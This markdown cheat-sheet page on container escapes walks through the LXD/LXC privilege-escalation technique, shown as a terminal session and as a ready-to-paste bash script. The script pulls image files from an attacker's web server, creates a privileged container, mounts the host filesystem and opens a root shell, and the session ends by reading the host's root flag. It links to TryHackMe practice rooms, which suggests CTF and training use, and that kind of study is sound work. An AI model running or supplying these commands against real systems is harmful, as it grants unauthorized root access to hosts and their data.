# Container


## Docker Container

## Linux Container LXD/LXC

[distrobuilder](https://github.com/lxc/distrobuilder): System container image builder for LXC and LXD

Import linux container image and exploit host
```
john@exploitable:/tmp$ ls
alpine.yaml
lxd.tar.xz
rootfs.squashfs

john@exploitable:/tmp$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
Image imported with fingerprint: 923442a81c422e888b04846489e5e4bd9984bcd2e4e7798c4682

john@exploitable:/tmp$ lxc image list
+--------+--------------+--------+-----------------------------------------+--------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |               DESCRIPTION
   |  ARCH  |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-----------------------------------------+--------+--------+------------------------------+
| alpine | 923442a81c42 | no     | Alpinelinux 3.12 x86_64 (20210104_0506) | x86_64 | 2.40MB | Jan 13, 2021 at 2:41am (UTC) |
+--------+--------------+--------+-----------------------------------------+--------+--------+------------------------------+

john@exploitable:/tmp$ lxc init alpine -c security.privileged=true
Creating the container
Error: No storage pool found. Please create a new storage pool
john@exploitable:/tmp$ lxd init

john@exploitable:/tmp$ lxc init alpine -c security.privileged=true
Creating the container
Container name is: faithful-mastodon
john@exploitable:/tmp$ lxc config device add faithful-mastodon container disk source=/ path=/mnt recursive=true
Device container added to faithful-mastodon
john@exploitable:/tmp$ lxc start faithful-mastodon
john@exploitable:/tmp$ lxc exec faithful-mastodon -- /bin/bash
john@exploitable:/tmp$ lxc exec faithful-mastodon /bin/bash
john@exploitable:/tmp$ lxc exec faithful-mastodon /bin/sh
~ # whoami
root
~ # pwd
/root

~ # cat /root/root.txt
cat: can't open '/root/root.txt': No such file or directory

~ # ls /mnt
bin             etc             lib             mnt             run             swap.img        var
boot            home            lib64           opt             sbin            sys             vmlinuz
cdrom           initrd.img      lost+found      proc            snap            tmp             vmlinuz.old
dev             initrd.img.old  media           root            srv             usr
~ # ls /mnt/root/
root.txt
~ # cat /mnt/root/root.txt
2exxxxxxxxxxxxxxxxxxxxxxxxxxxxfc
~ #
```

Put them all in  
```bash
cd /tmp
ip=your-adhoc-web-ip-address
wget http://$ip/alpine/alpine.yaml
wget http://$ip/alpine/lxd.tar.xz
wget http://$ip/alpine/rootfs.squashfs
ls -la /tmp

lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image ls
lxc init alpine -c security.privileged=true mycontainer
lxc config device add mycontainer container disk source=/ path=/mnt recursive=true
lxc start mycontainer
lxc exec mycontainer -- /bin/bash
lxc exec mycontainer /bin/bash
lxc exec mycontainer /bin/sh
whoami
ls /mnt/root
```

## Reference

[Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

[Lxd Privilege Escalation](https://www.hackingarticles.in/lxd-privilege-escalation/)

## Practice

[THM | Gaming Server](https://tryhackme.com/room/gamingserver): Exploit LXD container to get root flag  
[THM | HA Jocker CTF](https://tryhackme.com/room/jokerctf)
